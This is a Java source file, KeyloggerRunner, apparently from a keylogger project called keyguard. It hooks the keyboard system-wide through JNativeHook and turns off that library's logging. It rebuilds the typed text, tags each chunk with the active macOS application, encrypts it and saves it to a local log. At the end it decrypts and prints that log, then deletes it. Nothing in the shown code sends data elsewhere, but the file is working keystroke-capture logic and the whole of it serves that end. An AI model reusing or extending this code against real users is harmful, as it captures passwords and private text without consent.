package com.keyguard.javakeyguard.keylogger;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.keyguard.javakeyguard.keylogger.capture.GlobalKeyListener;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.keyguard.javakeyguard.keylogger.context.MacContextProvider;
import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
import com.keyguard.javakeyguard.model.EncryptedLogEntry;

import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyloggerRunner {
    private final EncryptionService encryptionService = new EncryptionService();
    private final ReconstructionService reconstructionService = new ReconstructionService();
    private final LogStorageService logStorageService = new LogStorageService();
    private final MacContextProvider contextProvider = new MacContextProvider();

    private String lastContext = "";

    public void start() {
        disableJNativeHookLogs();

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new GlobalKeyListener(this));
            System.out.println("Keylogger started...");
        } catch (NativeHookException e) {
            throw new RuntimeException("Failed to start native hook", e);
        }
    }

    public void handleKeyPressed(NativeKeyEvent e) {
        String currentContext = contextProvider.getActiveApplication();

        if (currentContext == null || currentContext.isBlank()) {
            currentContext = "Unknown Window";
        }

        if (lastContext.isBlank()) {
            lastContext = currentContext;
        }

        if (!currentContext.equals(lastContext)) {
            flushCurrentBuffer();
            reconstructionService.reset();
            lastContext = currentContext;
        }

        reconstructionService.handleKeyPressed(e);
    }

    public void handleKeyReleased() {
        reconstructionService.handleKeyReleased();
    }

    public void flushCurrentBuffer() {
        String text = reconstructionService.getCurrentText();

        if (text == null || text.isBlank()) {
            return;
        }

        String encrypted = encryptionService.encrypt(text);

        EncryptedLogEntry entry = new EncryptedLogEntry(
                System.currentTimeMillis(),
                lastContext,
                encrypted
        );

        logStorageService.save(entry);
    }

    public void printFinalDecryptedLog() {
        flushCurrentBuffer();
        encryptionService.printDecryptedLogFile("logs/encrypted-log.ndjson");
        cleanupLogFile();
    }

    private void disableJNativeHookLogs() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }

    private void cleanupLogFile() {
        try {
            java.nio.file.Files.deleteIfExists(java.nio.file.Path.of("logs/encrypted-log.ndjson"));
            System.out.println("Log file cleaned up.");
        } catch (java.io.IOException e) {
            System.out.println("Failed to clean up log file.");
        }
    }
}